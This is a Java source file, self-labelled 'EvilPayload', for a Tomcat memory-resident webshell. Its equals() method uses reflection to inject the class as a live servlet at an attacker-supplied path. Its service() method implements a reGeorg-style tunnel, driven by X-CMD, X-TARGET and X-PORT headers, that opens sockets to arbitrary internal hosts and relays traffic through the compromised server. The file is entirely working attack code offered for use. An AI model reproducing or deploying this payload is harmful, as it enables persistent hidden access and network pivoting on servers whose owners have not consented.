package x;

import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.JspFactory;
import javax.servlet.jsp.JspWriter;
import javax.servlet.jsp.PageContext;
import javax.servlet.jsp.SkipPageException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;

/**
 * @className EvilPayload
 * @Description TODO
 * @Author sunnylast0
 * @Date 2020/10/19 0:28
 * @Version 1.0
 **/
public class RegeogSpringServlet implements Servlet {
    private String path;

    public RegeogSpringServlet() {

    }

    public void init(ServletConfig paramServletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    // init
    @Override
    public boolean equals(Object conreq) {
        Request request = (Request) conreq;
        Response response = request.getResponse();
        try {
            this.path = request.getParameter("path");
            ServletContext servletContext = request.getServletContext();
            if (this.path != null && servletContext != null) {
                dynamicAddServlet(servletContext);
                response.getWriter().write("dynamic inject success");
                response.getWriter().flush();
                response.getWriter().close();
            } else {
                response.getWriter().write("dynamic inject Fail");
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (Exception e) {
            try {
                StackTraceElement[] stackTraceElementArray = e.getStackTrace();
                StringBuffer sb = new StringBuffer();
                for (StackTraceElement stackTraceElement : stackTraceElementArray) {
                    sb.append(stackTraceElement.toString()).append("\n");
                }
                response.getWriter().write(sb.toString());
                response.getWriter().flush();
                response.getWriter().close();
            } catch (IOException ioException) {
                ;
            }
        }
        return true;
    }

    public void service(ServletRequest arg0, ServletResponse arg1) throws ServletException, IOException {
        HttpServletRequest request;
        HttpServletResponse response;
        try {
            request = (HttpServletRequest) arg0;
            response = (HttpServletResponse) arg1;
            HttpSession session = request.getSession();
            String cmd = request.getHeader("X-CMD");
            if (cmd != null) {
                response.setHeader("X-STATUS", "OK");
                if (cmd.compareTo("CONNECT") == 0) {
                    try {
                        String target = request.getHeader("X-TARGET");
                        int port = Integer.parseInt(request.getHeader("X-PORT"));
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.connect(new InetSocketAddress(target, port));
                        socketChannel.configureBlocking(false);
                        session.setAttribute("socket", socketChannel);
                        response.setHeader("X-STATUS", "OK");
                    } catch (UnknownHostException e) {
                        System.out.println(e.getMessage());
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                    } catch (IOException e) {
                        System.out.println(e.getMessage());
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");

                    }
                } else if (cmd.compareTo("DISCONNECT") == 0) {
                    SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
                    try {
                        socketChannel.socket().close();
                    } catch (Exception ex) {
                        System.out.println(ex.getMessage());
                    }
                    session.invalidate();
                } else if (cmd.compareTo("READ") == 0) {
                    SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
                    try {
                        ByteBuffer buf = ByteBuffer.allocate(512);
                        int bytesRead = socketChannel.read(buf);
                        ServletOutputStream so = response.getOutputStream();
                        while (bytesRead > 0) {
                            so.write(buf.array(), 0, bytesRead);
                            so.flush();
                            buf.clear();
                            bytesRead = socketChannel.read(buf);
                        }
                        response.setHeader("X-STATUS", "OK");
                        so.flush();
                        so.close();

                    } catch (Exception e) {
                        System.out.println(e.getMessage());
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                        //socketChannel.socket().close();
                    }

                } else if (cmd.compareTo("FORWARD") == 0) {
                    SocketChannel socketChannel = (SocketChannel) session.getAttribute("socket");
                    try {

                        int readlen = request.getContentLength();
                        byte[] buff = new byte[readlen];

                        request.getInputStream().read(buff, 0, readlen);
                        ByteBuffer buf = ByteBuffer.allocate(readlen);
                        buf.clear();
                        buf.put(buff);
                        buf.flip();

                        while (buf.hasRemaining()) {
                            socketChannel.write(buf);
                        }
                        response.setHeader("X-STATUS", "OK");
                        //response.getOutputStream().close();

                    } catch (Exception e) {
                        System.out.println(e.getMessage());
                        response.setHeader("X-ERROR", e.getMessage());
                        response.setHeader("X-STATUS", "FAIL");
                        socketChannel.socket().close();
                    }
                }
            } else {
                //PrintWriter o = response.getWriter();
                response.getWriter().write("Georg says, 'All seems fine'");
                response.getWriter().flush();
                response.getWriter().close();
            }
        } catch (ClassCastException var6) {
            throw new ServletException("non-HTTP request or response");
        }

    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public void dynamicAddServlet(ServletContext servletContext) throws Exception {

        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField("context");
        applicationContextField.setAccessible(true);

        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
        Field standardContextField = applicationContext.getClass().getDeclaredField("context");
        standardContextField.setAccessible(true);
        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

        Wrapper wrapper = standardContext.createWrapper();
        wrapper.setName(path);
        standardContext.addChild(wrapper);

        wrapper.setServletClass(this.getClass().getName());
        wrapper.setServlet(this);

        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
        registration.addMapping(path);
        registration.setLoadOnStartup(1);
    }

}
